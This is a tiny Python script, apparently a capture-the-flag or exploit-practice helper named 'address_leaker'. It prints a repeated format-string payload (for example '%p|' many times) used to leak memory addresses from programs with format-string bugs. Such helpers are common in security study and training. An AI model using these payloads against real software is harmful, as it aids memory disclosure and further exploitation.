import sys

for i in range(int(sys.argv[2])):  #Usage: python address_leaker [p,s,x,...] [number of times]
    print(f"%{sys.argv[1]}|", end="")
